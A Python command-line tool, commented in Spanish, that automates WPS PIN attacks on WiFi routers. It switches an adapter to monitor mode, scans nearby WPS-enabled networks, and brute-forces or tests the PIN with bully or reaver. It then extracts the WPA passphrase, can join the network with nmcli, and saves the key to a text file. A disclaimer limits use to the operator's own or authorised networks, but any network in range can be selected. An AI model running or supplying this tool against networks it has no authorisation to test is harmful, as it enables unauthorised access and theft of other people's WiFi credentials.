#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=====================================================================
 WiFi WPS Tester
 Herramienta CLI para probar la seguridad WPS de tu propia red (o de
 una red con autorizacion explicita de su propietario).

 Flujo:
   1. Elegir antena / interfaz WiFi (marca las que son USB)
   2. Escanear redes con WPS activo (wash) y resolver sus ESSIDs
      con airodump-ng
   3. Elegir la red objetivo
   4. Probar el PIN WPS:
        - Fuerza bruta completa (bully o reaver)
        - O un PIN concreto de 8 digitos
   5. Guardar los resultados en un .txt (se pudo obtener la clave
      o no) y, opcionalmente, verificar la conexion con nmcli

 Requisitos:
   - Linux (Kali, Parrot, Debian, Ubuntu, Arch...)
   - Ejecucion como root
   - Adaptador WiFi con soporte de modo monitor
   - Herramientas: iw, airmon-ng, airodump-ng, wash y bully o reaver
     (Kali/Parrot las traen por defecto; con --install-deps se instalan)

 NOTA: el PIN WPS tiene 8 digitos (7 + digito de control). La fuerza
 bruta prueba ~11.000 combinaciones (el PIN se divide en dos mitades),
 por lo que puede tardar HORAS. Muchos routers bloquean WPS tras
 varios intentos fallidos.

 AVISO LEGAL:
   Usa esta herramienta solo en redes propias o con permiso por escrito
   del propietario. Atacar redes ajenas sin autorizacion es ilegal en
   la mayoria de jurisdicciones.
=====================================================================
"""

import argparse
import os
import re
import shutil
import subprocess
import sys
import tempfile
import threading
import time
from datetime import datetime

# --------------------------- Presentacion ---------------------------

USE_COLOR = sys.stdout.isatty()

def _c(txt, code):
    return "\033[%sm%s\033[0m" % (code, txt) if USE_COLOR else txt

def bold(t):   return _c(t, "1")
def cyan(t):   return _c(t, "1;36")
def green(t):  return _c(t, "1;32")
def yellow(t): return _c(t, "1;33")
def red(t):    return _c(t, "1;31")

def banner():
    print(bold("""
=============================================================
   WiFi WPS Tester  -  Auditoria de seguridad WPS
   Solo para redes propias o con autorizacion explícita
=============================================================""".lstrip("\n")))

# --------------------------- Comandos ---------------------------

def run_cmd(cmd, timeout=None):
    """Ejecuta un comando. Devuelve (returncode, salida)."""
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.returncode, (r.stdout or "") + (r.stderr or "")
    except FileNotFoundError:
        return -1, ""
    except subprocess.TimeoutExpired:
        return -1, ""

def _stop(proc):
    try:
        proc.terminate()
        try:
            proc.wait(timeout=8)
        except subprocess.TimeoutExpired:
            proc.kill()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                pass
    except Exception:
        pass

def run_capture(cmd, seconds, on_line=None):
    """
    Ejecuta un comando capturando su salida en vivo durante `seconds`
    segundos (o hasta que termine / el usuario pulse Ctrl+C).
    Devuelve (correcto, salida_completa).
    """
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, text=True, bufsize=1)
    except FileNotFoundError:
        return False, "[!] No se encontro el comando: %s\n" % cmd[0]

    lines = []

    def reader():
        for line in proc.stdout:
            lines.append(line)
            if on_line is not None:
                try:
                    on_line(line.rstrip())
                except Exception:
                    pass

    t = threading.Thread(target=reader, daemon=True)
    t.start()
    try:
        proc.wait(timeout=seconds)
    except subprocess.TimeoutExpired:
        _stop(proc)
    except KeyboardInterrupt:
        print(yellow("\n[!] Detenido por el usuario."))
        _stop(proc)
    t.join(3)
    return True, "".join(lines)

def ask(prompt, default=False):
    """Pide confirmacion por teclado. Devuelve True/False."""
    suf = " [S/n] " if default else " [s/N] "
    try:
        ans = input(prompt + suf).strip().lower()
    except (EOFError, KeyboardInterrupt):
        print()
        return bool(default)
    if not ans:
        return bool(default)
    return ans.startswith("s") or ans.startswith("y")

# --------------------------- Dependencias ---------------------------

BASE_TOOLS = ["iw", "airmon-ng", "airodump-ng", "wash"]
ATTACK_TOOLS = ["bully", "reaver"]

def check_dependencies():
    missing = [t for t in BASE_TOOLS if not shutil.which(t)]
    available = [t for t in ATTACK_TOOLS if shutil.which(t)]
    return missing, available

def install_dependencies():
    print(cyan("\n==> Instalando dependencias (puede pedir la contrasena de sudo)..."))
    if shutil.which("apt-get"):
        run_cmd(["apt-get", "update"], timeout=900)
        run_cmd(["apt-get", "install", "-y", "aircrack-ng", "reaver", "bully"],
                timeout=1800)
    elif shutil.which("dnf"):
        run_cmd(["dnf", "install", "-y", "aircrack-ng", "reaver", "bully"],
                timeout=1800)
    elif shutil.which("pacman"):
        run_cmd(["pacman", "-S", "--noconfirm", "aircrack-ng", "reaver"],
                timeout=1800)
        print(yellow("[!] En Arch, 'bully' puede requerir AUR:  yay -S bully"))
    elif shutil.which("apk"):
        run_cmd(["apk", "add", "aircrack-ng", "reaver", "bully"], timeout=1800)
    else:
        print(red("[!] No se detecto un gestor de paquetes compatible."))
        return False
    missing, available = check_dependencies()
    if missing or not available:
        print(yellow("[!] Aun faltan: %s"
                     % (missing + [t for t in ATTACK_TOOLS if t not in available])))
        print("    Instalalos manualmente segun tu distribucion.")
    else:
        print(green("[✔] Todas las herramientas estan disponibles."))
    return True

# --------------------------- Interfaces ---------------------------

def list_wifi_interfaces():
    """Devuelve {nombre: {'usb': bool}} de las interfaces WiFi."""
    ifaces = []
    code, out = run_cmd(["iw", "dev"])
    if code == 0:
        ifaces = re.findall(r"Interface\s+(\S+)", out)
    if not ifaces:
        code, out = run_cmd(["iwconfig"])
        for line in out.splitlines():
            if "IEEE 802.11" in line:
                ifaces.append(line.split()[0])
    info = {}
    for name in ifaces:
        usb = False
        try:
            target = os.readlink("/sys/class/net/%s/device" % name).lower()
            usb = "usb" in target
        except OSError:
            pass
        info[name] = {"usb": usb}
    return info

def usb_wifi_names():
    """Adaptadores WiFi USB visibles en lsusb (solo informativo)."""
    code, out = run_cmd(["lsusb"])
    if code != 0:
        return []
    kw = ("wireless", "wlan", "wifi", "802.11", "wimax",
          "ralink", "mediatek", "realtek", "atheros", "broadcom",
          "intel", "tp-link", "alfa", "netgear", "d-link")
    names = []
    for line in out.splitlines():
        low = line.lower()
        if any(k in low for k in kw):
            names.append(line.strip())
    return names

def choose_interface(prefer=None):
    """Lista las interfaces WiFi y pide elegir una. Devuelve (nombre, es_usb)."""
    ifaces = list_wifi_interfaces()
    if not ifaces:
        print(red("[!] No se encontraron interfaces WiFi. ¿Esta conectada la antena?"))
        sys.exit(1)
    names = sorted(ifaces)
    print(bold("\n=== Antenas / interfaces WiFi detectadas ==="))
    for i, name in enumerate(names, 1):
        tag = "USB" if ifaces[name]["usb"] else "integrada/PCI"
        print("  [%d] %-10s (%s)" % (i, name, tag))
    usb = usb_wifi_names()
    if usb:
        print("  Adaptadores USB visibles en lsusb:")
        for line in usb:
            print("        - " + line)
    if prefer:
        if prefer in ifaces:
            return prefer, ifaces[prefer]["usb"]
        print(red("[!] La interfaz '%s' no existe." % prefer))
        sys.exit(1)
    if len(names) == 1:
        print("\nUsando la unica interfaz disponible: %s" % names[0])
        return names[0], ifaces[names[0]]["usb"]
    while True:
        sel = input("\nElige la antena [1-%d]: " % len(names)).strip()
        if sel.isdigit() and 1 <= int(sel) <= len(names):
            name = names[int(sel) - 1]
            return name, ifaces[name]["usb"]
        print(yellow("Seleccion no valida."))

def enter_monitor_mode(iface):
    if ask("¿Liberar la interfaz con 'airmon-ng check kill'?", default=True):
        run_cmd(["airmon-ng", "check", "kill"], timeout=180)
    print(cyan("\n==> Activando modo monitor en %s ..." % iface))
    code, out = run_cmd(["airmon-ng", "start", iface], timeout=180)
    for line in out.splitlines()[-8:]:
        print("   " + line)
    m = re.search(r"monitor mode (?:v )?enabled on ([^\s)]+)", out)
    mon = m.group(1) if m else iface + "mon"
    code, out = run_cmd(["iw", "dev", mon, "info"])
    if "type monitor" not in out:
        print(red("[!] No se pudo verificar el modo monitor en '%s'." % mon))
        print("    Comprueba que tu antena soporta modo monitor y que los")
        print("    drivers son los correctos (ej. los de aircrack-ng).")
        sys.exit(1)
    print(green("[✔] Modo monitor activo: %s" % mon))
    return mon

def exit_monitor_mode(mon):
    print(cyan("\n==> Restaurando interfaz (airmon-ng stop %s) ..." % mon))
    run_cmd(["airmon-ng", "stop", mon], timeout=120)

# --------------------------- Escaneo ---------------------------

ANSI = re.compile(r"\x1b\[[0-9;]*[A-Za-z]")
MAC_RE = r"([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})"

def scan_wps(mon, seconds):
    """Escanea con wash y devuelve (lista_de_redes, salida_en_crudo)."""
    print(cyan("\n==> Escaneando redes con WPS (wash) durante %d s ..." % seconds))
    print("    (Ctrl+C para terminar antes)\n")

    def live(line):
        clean = ANSI.sub("", line)
        if re.match(r"\s*" + MAC_RE + r"\s", clean):
            print("   " + clean.strip())

    ok, out = run_capture(["wash", "-i", mon], seconds, on_line=live)
    return parse_wash(out), out

def parse_wash(out):
    """Interpreta la salida de wash (formato nuevo y antiguo)."""
    nets = []
    seen = set()
    for raw in out.splitlines():
        line = ANSI.sub("", raw)
        # Formato wash 1.6.x: BSSID Ch dBm WPS Lck Vendor ESSID
        m = re.match(r"\s*" + MAC_RE + r"\s+(\d+)\s+(-?\d+)\s+(\S+)\s+"
                     r"(\S+)\s+(\S+)\s+(.*)$", line)
        if m:
            bssid, channel, rssi, wps, lck, vendor, essid = m.groups()
            locked = "Si" if lck.strip().lower() == "yes" else "No"
        else:
            # Formato antiguo: BSSID RSSI Channel Lock ...
            m = re.match(r"\s*" + MAC_RE + r"\s+(-?\d+)\s+(\d+)\s+(\S+)\s+(.*)$",
                         line)
            if not m:
                continue
            bssid, rssi, channel, _lock, rest = m.groups()
            essid = ""
            if re.search(r"not\s+locked", rest, re.I):
                locked = "No"
            elif re.search(r"\blocked\b", rest, re.I):
                locked = "Si"
            else:
                locked = "?"
        bssid = bssid.upper()
        if bssid in seen:
            continue
        seen.add(bssid)
        nets.append({
            "bssid": bssid,
            "rssi": int(rssi),
            "channel": int(channel),
            "locked": locked,
            "essid": essid.strip(),
        })
    nets.sort(key=lambda n: n["rssi"], reverse=True)
    return nets

def resolve_essids(mon, seconds):
    """Captura breve con airodump-ng para asociar BSSID -> ESSID."""
    print(cyan("\n==> Resolviendo nombres de red (ESSID) con airodump-ng "
               "(%d s) ..." % seconds))
    tmpdir = tempfile.mkdtemp(prefix="wps_scan_")
    base = os.path.join(tmpdir, "cap")
    run_capture(["airodump-ng", "--output-format", "csv", "-w", base, mon], seconds)
    essids = {}
    try:
        for fname in os.listdir(tmpdir):
            if fname.endswith(".csv"):
                with open(os.path.join(tmpdir, fname),
                          encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        parts = line.split(",")
                        if len(parts) < 14:
                            continue
                        bssid = parts[0].strip().upper()
                        if re.fullmatch(r"[0-9A-F:]{17}", bssid):
                            essid = parts[13].strip()
                            if essid and not essid.startswith("\\x00"):
                                essids[bssid] = essid
    except OSError:
        pass
    shutil.rmtree(tmpdir, ignore_errors=True)
    return essids

def choose_network(nets, essids):
    print(bold("\n=== Redes con WPS detectadas ==="))
    print("  %2s  %-22s %-18s %5s %5s  %s"
          % ("#", "ESSID", "BSSID", "Canal", "RSSI", "WPS bloqueado"))
    for i, n in enumerate(nets, 1):
        essid = n["essid"] or essids.get(n["bssid"], "<oculta>")
        print("  %2d  %-22s %-18s %5d %5d  %s"
              % (i, essid[:22], n["bssid"], n["channel"], n["rssi"], n["locked"]))
    while True:
        sel = input("\nElige la red objetivo [1-%d]: " % len(nets)).strip()
        if sel.isdigit() and 1 <= int(sel) <= len(nets):
            return nets[int(sel) - 1]
        print(yellow("Seleccion no valida."))

# --------------------------- Ataque ---------------------------

def choose_attack_tool(available):
    if len(available) == 1:
        return available[0]
    print(bold("\n=== Herramienta de ataque ==="))
    print("  [1] bully   (suele ser mas rapido)")
    print("  [2] reaver  (el clasico, muy estable)")
    while True:
        sel = input("Elige [1-2]: ").strip()
        if sel == "1":
            return "bully"
        if sel == "2":
            return "reaver"
        print(yellow("Seleccion no valida."))

def build_attack_cmd(tool, mon, net, essid, pin=None):
    if tool == "bully":
        # En bully la interfaz es el ultimo argumento
        cmd = ["bully", "-b", net["bssid"], "-c", str(net["channel"]),
               "-v", "2"]
        if essid:
            cmd += ["-e", essid]
        if pin:
            cmd += ["-p", pin]
        cmd.append(mon)
        return cmd
    cmd = ["reaver", "-i", mon, "-b", net["bssid"],
           "-c", str(net["channel"]), "-vv", "-S"]
    if essid:
        cmd += ["-e", essid]
    if pin:
        cmd += ["-p", pin, "-g", "1"]   # probar solo ese PIN y salir
    return cmd

def run_attack(cmd, minutes):
    print(cyan("\n==> Ataque en marcha (max. %d min, Ctrl+C para parar "
               "antes) ...\n" % minutes))
    ok, out = run_capture(cmd, minutes * 60, on_line=lambda l: print("   | " + l))
    return out

def parse_attack(out):
    res = {"pin": None, "psk": None, "ssid": None, "locked_hint": False}
    m = re.search(r"WPS PIN:\s*['\"]?(\d{7,8})", out)
    if m:
        res["pin"] = m.group(1)
    m = (re.search(r"WPA PSK:\s*'([^']*)'|WPA PSK:\s*\"([^\"]*)\"|"
                   r"WPA PSK:\s*(\S.*)$", out, re.M))
    if m:
        res["psk"] = (m.group(1) or m.group(2) or m.group(3) or "").strip()
    m = (re.search(r"AP SSID:\s*'([^']*)'|AP SSID:\s*\"([^\"]*)\"|"
                   r"AP SSID:\s*(\S.*)$", out, re.M))
    if m:
        res["ssid"] = (m.group(1) or m.group(2) or m.group(3) or "").strip()
    res["locked_hint"] = bool(
        re.search(r"\blocked\b|rate.?limit|too many attempts|"
                  r"WPS transaction failed", out, re.I))
    return res

def verify_connection(essid, psk):
    """Intenta conectarse con nmcli para comprobar que la clave sirve."""
    if not essid or not psk or not shutil.which("nmcli"):
        return None
    if not ask("¿Intentar conectar a '%s' con la clave obtenida para "
               "verificar?" % essid, default=False):
        return None
    code, out = run_cmd(["nmcli", "dev", "wifi", "connect", essid,
                         "password", psk], timeout=90)
    ok = ("successfully activated" in out.lower()
          or "activaci" in out.lower())
    return ok, out

# --------------------------- Resultados ---------------------------

def fmt_duration(seconds):
    seconds = int(seconds)
    h, rem = divmod(seconds, 3600)
    m, s = divmod(rem, 60)
    if h:
        return "%d h %d min" % (h, m)
    if m:
        return "%d min %d s" % (m, s)
    return "%d s" % s

def save_results(path, data):
    lines = []
    lines.append("=" * 62)
    lines.append(" RESULTADOS DE PRUEBA WPS - WiFi WPS Tester")
    lines.append("=" * 62)
    lines.append(" Fecha:               %s" % data["fecha"])
    lines.append(" Interfaz:            %s (%s)"
                 % (data["iface"], "USB" if data["usb"] else "integrada/PCI"))
    lines.append(" Interfaz monitor:    %s" % data["mon"])
    lines.append("-" * 62)
    lines.append(" RED OBJETIVO")
    lines.append("   ESSID:          %s" % data["essid"])
    lines.append("   BSSID:          %s" % data["bssid"])
    lines.append("   Canal:          %s" % data["channel"])
    lines.append("   Señal (RSSI):   %s dBm" % data["rssi"])
    lines.append("   WPS bloqueado:  %s" % data["locked"])
    lines.append("-" * 62)
    lines.append(" PRUEBA")
    lines.append("   Metodo:         %s" % data["metodo"])
    lines.append("   Duracion:       %s" % data["duracion"])
    lines.append("   Comando:        %s" % " ".join(data["cmd"]))
    lines.append("-" * 62)
    lines.append(" RESULTADO: %s" % data["resultado"])
    if data["pin"]:
        lines.append("   PIN WPS:        %s" % data["pin"])
    if data["psk"]:
        lines.append("   Clave WPA:      %s" % data["psk"])
    if data["ssid_revelado"]:
        lines.append("   ESSID revelado: %s" % data["ssid_revelado"])
    if data["conexion"] is not None:
        ok, nm_out = data["conexion"]
        lines.append("   Conexion verificada: %s" % ("SI" if ok else "NO"))
        for l in nm_out.strip().splitlines()[-5:]:
            lines.append("     " + l)
    lines.append("-" * 62)
    lines.append(" Salida del ataque (ultimas 60 lineas):")
    for l in data["log"].splitlines()[-60:]:
        lines.append("   " + l)
    lines.append("=" * 62)
    lines.append(" AVISO: usa esta herramienta solo en redes propias o "
                 "autorizadas.")
    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")

def save_full_log(path, out):
    with open(path, "w", encoding="utf-8") as f:
        f.write(out)

# --------------------------- Principal ---------------------------

def main():
    parser = argparse.ArgumentParser(
        description="Herramienta de pruebas WiFi (WPS) para auditoria de "
                    "redes propias o autorizadas.")
    parser.add_argument("--install-deps", action="store_true",
                        help="Instala las dependencias (aircrack-ng, reaver, "
                             "bully) y sale")
    parser.add_argument("--iface",
                        help="Interfaz WiFi a usar (si no se indica, se pregunta)")
    parser.add_argument("--scan-seconds", type=int, default=30,
                        help="Segundos de escaneo WPS con wash (por defecto: 30)")
    parser.add_argument("--essid-seconds", type=int, default=10,
                        help="Segundos de captura para resolver ESSIDs "
                             "(por defecto: 10)")
    parser.add_argument("--attack-minutes", type=int, default=60,
                        help="Tiempo maximo de ataque en minutos (por defecto: 60)")
    parser.add_argument("--output",
                        help="Archivo de resultados (por defecto: "
                             "resultados_wps_<fecha>.txt)")
    parser.add_argument("--full-log", action="store_true",
                        help="Guardar ademas la salida completa del ataque "
                             "en un .log")
    parser.add_argument("--no-essid-scan", action="store_true",
                        help="No capturar ESSIDs con airodump-ng")
    args = parser.parse_args()

    banner()

    if os.geteuid() != 0:
        print(red("[!] Esta herramienta debe ejecutarse como root:"))
        print("    sudo python3 wifi_wps_tester.py")
        sys.exit(1)

    if args.install_deps:
        install_dependencies()
        return

    missing, available = check_dependencies()
    if missing or not available:
        print(red("[!] Faltan herramientas en el sistema:"))
        for t in missing:
            print("    - " + t)
        if not available:
            print("    - bully o reaver (al menos uno)")
        print("  Instalalas con:  sudo python3 wifi_wps_tester.py --install-deps")
        sys.exit(1)

    iface, iface_usb = choose_interface(args.iface)
    mon = None
    try:
        mon = enter_monitor_mode(iface)

        nets, wash_out = scan_wps(mon, args.scan_seconds)
        essids = {}
        if nets and not args.no_essid_scan:
            essids = resolve_essids(mon, args.essid_seconds)

        resultado_txt = args.output or \
            "resultados_wps_%s.txt" % datetime.now().strftime("%Y%m%d_%H%M%S")

        if not nets:
            print(yellow("\n[!] No se detectaron redes con WPS activo."))
            print("    Prueba a aumentar --scan-seconds, acercar la antena")
            print("    o comprobar que el WPS del router esta activado.")
            save_results(resultado_txt, {
                "fecha": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "iface": iface, "usb": iface_usb, "mon": mon,
                "essid": "(ninguna)", "bssid": "(ninguna)",
                "channel": "-", "rssi": "-", "locked": "-",
                "metodo": "Escaneo WPS con wash (%d s)" % args.scan_seconds,
                "duracion": fmt_duration(args.scan_seconds),
                "cmd": ["wash", "-i", mon],
                "resultado": "SIN REDES CON WPS DETECTADAS",
                "pin": None, "psk": None, "ssid_revelado": None,
                "conexion": None, "log": wash_out,
            })
            print("\n[*] Resultados guardados en: %s" % resultado_txt)
            return

        net = choose_network(nets, essids)
        essid = net["essid"] or essids.get(net["bssid"])

        # --- Metodo de prueba ---
        print(bold("\n=== Metodo de prueba ==="))
        print("  [1] Fuerza bruta WPS completa (puede tardar horas)")
        print("  [2] Probar un PIN concreto de 8 digitos")
        pin = None
        while True:
            sel = input("Elige [1-2]: ").strip()
            if sel in ("1", "2"):
                break
            print(yellow("Seleccion no valida."))
        if sel == "2":
            while True:
                pin = input("PIN de 8 digitos: ").strip()
                if re.fullmatch(r"\d{8}", pin):
                    break
                print(yellow("El PIN debe tener exactamente 8 digitos."))
            modo = "PIN manual (%s)" % pin
        else:
            modo = "Fuerza bruta WPS"

        tool = choose_attack_tool(available)
        cmd = build_attack_cmd(tool, mon, net, essid, pin)

        if net["locked"] == "Si":
            print(yellow("[!] wash indica que el WPS de este router esta "
                         "bloqueado:"))
            print("    es probable que la prueba falle hasta que se desbloquee.")

        print(bold("\nObjetivo: %s  %s  canal %d  (%d dBm)"
                   % (essid or "<oculta>", net["bssid"],
                      net["channel"], net["rssi"])))
        print("Herramienta: %s    Metodo: %s" % (tool, modo))
        if not ask("¿Iniciar la prueba?", default=True):
            print("Cancelado por el usuario.")
            return

        minutos = min(args.attack_minutes, 3) if pin else args.attack_minutes
        start = time.time()
        out = run_attack(cmd, minutos)
        dur = time.time() - start
        res = parse_attack(out)

        conn = None
        if res["psk"]:
            conn = verify_connection(res["ssid"] or essid, res["psk"])

        if res["pin"] and res["psk"]:
            resultado = "VULNERABLE - PIN WPS obtenido"
        elif res["pin"]:
            resultado = "PIN obtenido, pero no se consiguio la clave WPA"
        elif pin:
            resultado = "PIN manual incorrecto (o sin respuesta del router)"
        else:
            resultado = "SIN EXITO - no se obtuvo el PIN en el tiempo dado"

        save_results(resultado_txt, {
            "fecha": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "iface": iface, "usb": iface_usb, "mon": mon,
            "essid": essid or "<oculta>",
            "bssid": net["bssid"],
            "channel": net["channel"], "rssi": net["rssi"],
            "locked": net["locked"],
            "metodo": "%s con %s" % (modo, tool),
            "duracion": fmt_duration(dur),
            "cmd": cmd,
            "resultado": resultado,
            "pin": res["pin"], "psk": res["psk"],
            "ssid_revelado": res["ssid"],
            "conexion": conn, "log": out,
        })
        if args.full_log:
            log_path = "log_ataque_%s.txt" % datetime.now().strftime("%Y%m%d_%H%M%S")
            save_full_log(log_path, out)
            print("[*] Log completo guardado en: %s" % log_path)

        print("\n" + bold("=== Resumen ==="))
        print("  Resultado: %s" % resultado)
        if res["pin"]:
            print("  PIN WPS:   %s" % res["pin"])
        if res["psk"]:
            print("  Clave WPA: %s" % res["psk"])
        if res["locked_hint"]:
            print(yellow("  [!] El router parece haber bloqueado WPS por "
                         "demasiados intentos."))
        print("\n[✔] Resultados guardados en: %s" % resultado_txt)
    finally:
        if mon:
            exit_monitor_mode(mon)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(yellow("\n[!] Abortado por el usuario."))
        sys.exit(130)
